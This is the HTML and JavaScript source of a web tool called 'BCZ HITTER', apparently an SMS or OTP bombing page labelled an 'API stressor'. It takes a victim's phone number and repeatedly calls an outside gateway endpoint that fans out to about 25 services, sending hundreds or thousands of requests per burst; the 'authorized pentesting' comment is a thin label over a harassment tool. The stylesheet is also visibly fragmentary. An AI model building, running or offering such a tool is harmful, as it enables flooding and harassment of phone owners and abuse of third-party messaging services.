    <style>

        body {

        /* ===== BURST BUTTONS ===== */

        .burst-btn .sub { display: block; font-size: 0.48rem; color: #006633; font-family: 'Fira Code', monospace; margin-top: 3px; letter-spacing: 1px; }
        .burst-btn:hover { border-color: #00ff44; box-shadow: 0 0 20px rgba(0,255,136,0.1); background: rgba(0,255,136,0.02); }
        .burst-btn:active { transform: scale(0.96); }
        .burst-btn:disabled { opacity: 0.15; cursor: not-allowed; transform: none !important; }
        .burst-btn.busy { border-color: #ff0044; color: #ff0044; animation: pulse-btn 1s infinite; }
        @keyframes pulse-btn { 0%,100%{box-shadow:0 0 5px rgba(255,0,68,0.2);} 50%{box-shadow:0 0 20px rgba(255,0,68,0.5);} }

        /* ===== HIT COUNTER ===== */
        .counter-box {
            background: rgba(0,10,5,0.7); border: 1px solid #003322;
            border-radius: 8px; padding: 18px; margin-bottom: 16px;
            text-align: center;

        .counter-label {
            font-size: 0.55rem; color: #005533; letter-spacing: 3px; text-transform: uppercase;

        .counter-value {

            color: #00ff88; text-shadow: 0 0 20px rgba(0,255,136,0.3);
            margin: 6px 0;
        }

        .counter-sub {
            font-size: 0.5rem; color: #004422; letter-spacing: 2px;
        }

        /* ===== PROGRESS ===== */
        .progress-box { margin-bottom: 16px; }
        .progress-bar-bg { width: 100%; height: 14px; background: #001a0a; border: 1px solid #003322; border-radius: 7px; overflow: hidden; }
        .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #003322, #00ff88); border-radius: 7px; transition: width 0.3s; }
        .progress-text { text-align: center; font-size: 0.55rem; color: #008844; margin-top: 3px; }

        /* ===== ABORT ===== */

            border-radius: 6px; color: #ff0044; font-family: 'Orbitron', monospace;

        /* ===== CREDIT ===== */
        .credit-strip {

        .credit-item a { color: #00aa66; text-decoration: none; }

        /* ===== FOOTER ===== */
        .footer { text-align: center; margin-top: 25px; padding: 16px; border-top: 1px solid #002211; }

        .footer-b .r { color: #ff0044; }

        .footer-l a { color: #00aa66; text-decoration: none; }

        .wm { position: fixed; bottom: 10px; right: 15px; font-size: 0.45rem; color: #001a0a; z-index: 1; font-family: 'Orbitron', monospace; letter-spacing: 2px; pointer-events: none; opacity: 0.5; }
        .wm2 { position: fixed; bottom: 10px; left: 15px; font-size: 0.4rem; color: #001508; z-index: 1; font-family: 'Fira Code', monospace; pointer-events: none; opacity: 0.3; }

<body>

<div id="binary-bg"></div>
<div class="wm">BCZ / TEAM</div>
<div class="wm2">t.me/hacxo</div>

<div class="container">

    <!-- HEADER -->
    <header class="header">
        <h1 class="glitch"><span class="hl">BCZ</span> |HITTER|</h1>
        <div class="subtitle">MASTER <span class="sp">◆</span> API <span class="sp">◆</span> STRESSOR</div>
        <div class="status-row">
            <span class="badge" id="status-badge"><span class="dot" id="status-dot"></span> <span id="status-text">STANDBY</span></span>
            <span class="brand-tag"><a href="https://t.me/hacxo" target="_blank">✪ @hacxo</a></span>
            <span class="brand-tag">BCZ TEAM</span>
        </div>
    </header>

    <!-- MAIN -->
    <div class="main-box">

        <div class="section-title">⟫ STRESS TEST CONTROLS</div>

        <!-- PHONE -->
        <div class="input-wrap">
            <label>TARGET NUMBER</label>
            <input type="text" id="phone-input" placeholder="01XXXXXXXXX" value="" autocomplete="off" />
        </div>

        <!-- BURST -->
        <div class="burst-label">⟫ SELECT HITS</div>
        <div class="burst-grid">
            <button class="burst-btn" data-burst="20" onclick="launchBurst(20)">
                20 <span class="sub">500 API calls</span>
            </button>
            <button class="burst-btn" data-burst="50" onclick="launchBurst(50)">
                50 <span class="sub">1,250 API calls</span>
            </button>
            <button class="burst-btn" data-burst="100" onclick="launchBurst(100)">
                100 <span class="sub">2,500 API calls</span>
            </button>
        </div>

        <!-- COUNTER (only hits shown) -->
        <div class="counter-box">
            <div class="counter-label">HITS EXECUTED</div>
            <div class="counter-value" id="hit-counter">0</div>
            <div class="counter-sub" id="hit-sub">— awaiting launch —</div>
        </div>

        <!-- PROGRESS -->
        <div class="progress-box" id="progress-area" style="display:none;">
            <div class="progress-bar-bg"><div class="progress-bar-fill" id="progress-fill"></div></div>
            <div class="progress-text" id="progress-text">0 / 0</div>
        </div>

        <!-- ABORT -->
        <button class="abort-btn" id="btn-abort" onclick="abortAttack()" disabled>⟫ ABORT</button>

        <!-- CREDIT -->
        <div class="credit-strip">
            <span class="credit-item">⚡ <a href="https://t.me/hacxo" target="_blank">BCZ TEAM</a></span>
            <span class="credit-item">📡 <span class="ac">masterapi-sable</span></span>
            <span class="credit-item">🔐 <span class="ac">25 APIs</span></span>
        </div>

    </div>

    <!-- FOOTER -->
    <footer class="footer">
        <div class="footer-b"><span class="r">BCZ</span> TEAM <span style="color:#004422;">◆</span> SECURITY RESEARCH</div>
        <div class="footer-l">
            <a href="https://t.me/hacxo" target="_blank">TELEGRAM: @hacxo</a>
            <span class="sep">|</span> MASTER API GATEWAY <span class="sep">|</span> 25 INTEGRATED
        </div>
    </footer>

</div>

<script>
    // ================================================================
    // BCZ HITTER — API Stress Test Tool
    // Authorized pentesting use only
    // Shows ONLY hit count. Clean & minimal.
    // ================================================================

    const API_BASE = 'https://masterapi-sable.vercel.app/send?phone=';

    let isBusy = false;
    let killFlag = false;
    let hitsDone = 0;
    let currentTarget = 0;

    const phoneInput = document.getElementById('phone-input');
    const hitCounter = document.getElementById('hit-counter');
    const hitSub = document.getElementById('hit-sub');
    const pFill = document.getElementById('progress-fill');
    const pText = document.getElementById('progress-text');
    const pArea = document.getElementById('progress-area');
    const statusText = document.getElementById('status-text');
    const statusDot = document.getElementById('status-dot');
    const statusBadge = document.getElementById('status-badge');
    const btnAbort = document.getElementById('btn-abort');
    const burstBtns = document.querySelectorAll('.burst-btn');

    // ---- Binary BG ----
    (() => {
        const bg = document.getElementById('binary-bg');
        let h = '';
        for (let i = 0; i < 35; i++) {
            for (let j = 0; j < 70; j++) h += Math.random() > 0.5 ? '1' : '0';
            h += '\n';
        }
        bg.textContent = h;
        setInterval(() => {
            const ls = bg.textContent.split('\n');
            for (let i = 0; i < ls.length; i++) {
                let l = '';
                for (let j = 0; j < 70; j++) l += Math.random() > 0.5 ? '1' : '0';
                ls[i] = l;
            }
            bg.textContent = ls.join('\n');
        }, 300);
    })();

    // ---- UI State ----
    function setBusy(busy) {
        burstBtns.forEach(b => b.disabled = busy);
        btnAbort.disabled = !busy;
        phoneInput.disabled = busy;
        if (busy) {
            statusText.textContent = 'RUNNING';
            statusBadge.style.borderColor = '#ff0044';
            statusBadge.style.color = '#ff0044';
            statusDot.style.background = '#ff0044';
        } else {
            statusText.textContent = 'STANDBY';
            statusBadge.style.borderColor = '#00ff44';
            statusBadge.style.color = '#00ff88';
            statusDot.style.background = '#00ff44';
        }
    }

    // ---- Single API Hit ----
    async function doHit(phone) {
        const url = API_BASE + encodeURIComponent(phone);
        const resp = await fetch(url, { signal: AbortSignal.timeout(30000) });
        await resp.json();
        return true;
    }

    // ---- Update (only hit count) ----
    function refreshDisplay() {
        hitCounter.textContent = hitsDone;
        hitSub.textContent = currentTarget > 0
            ? `— ${hitsDone} / ${currentTarget} hits —`
            : '— awaiting launch —';
        if (currentTarget > 0) {
            const pct = (hitsDone / currentTarget) * 100;
            pFill.style.width = Math.min(100, pct) + '%';
            pText.textContent = `${hitsDone} / ${currentTarget}`;
        }
    }

    // ---- Launch ----
    async function launchBurst(target) {
        const phone = phoneInput.value.trim();
        if (!phone) { hitSub.textContent = '— enter a number first —'; return; }
        if (isBusy) return;

        killFlag = false;
        hitsDone = 0;
        currentTarget = target;

        hitCounter.textContent = '0';
        hitSub.textContent = `— 0 / ${target} hits —`;
        pArea.style.display = 'block';
        pFill.style.width = '0%';
        pText.textContent = `0 / ${target}`;

        setBusy(true);
        burstBtns.forEach(b => b.classList.remove('busy'));
        const active = document.querySelector(`.burst-btn[data-burst="${target}"]`);
        if (active) active.classList.add('busy');

        for (let i = 1; i <= target && !killFlag; i++) {
            try {
                await doHit(phone);
                if (killFlag) break;
                hitsDone = i;
                refreshDisplay();
            } catch (err) {
                if (killFlag) break;
                hitsDone = i;
                refreshDisplay();
            }
            if (!killFlag && i < target) {
                await new Promise(r => setTimeout(r, 100));
            }
        }

        burstBtns.forEach(b => b.classList.remove('busy'));
        setBusy(false);

        if (!killFlag) {
            hitSub.textContent = `✓ ${target}/${target} — COMPLETE`;
            pFill.style.width = '100%';
            pText.textContent = `${target}/${target} DONE`;
            statusText.textContent = 'COMPLETE';
            setTimeout(() => { statusText.textContent = 'STANDBY'; }, 3000);
        } else {
            hitSub.textContent = `⛔ ABORTED — ${hitsDone}/${currentTarget}`;
            statusText.textContent = 'ABORTED';
            setTimeout(() => { statusText.textContent = 'STANDBY'; }, 3000);
        }

        isBusy = false;
    }

    // ---- Abort ----
    function abortAttack() {
        if (!isBusy) return;
        killFlag = true;
        burstBtns.forEach(b => b.classList.remove('busy'));
        setBusy(false);
        isBusy = false;
        hitSub.textContent = '⛔ ABORTED';
    }

    // ---- Enter key ----
    phoneInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !isBusy && phoneInput.value.trim()) {
            launchBurst(20);
        }
    });

    // ---- Init ----
    hitSub.textContent = '— enter number → hit BURST —';
</script>
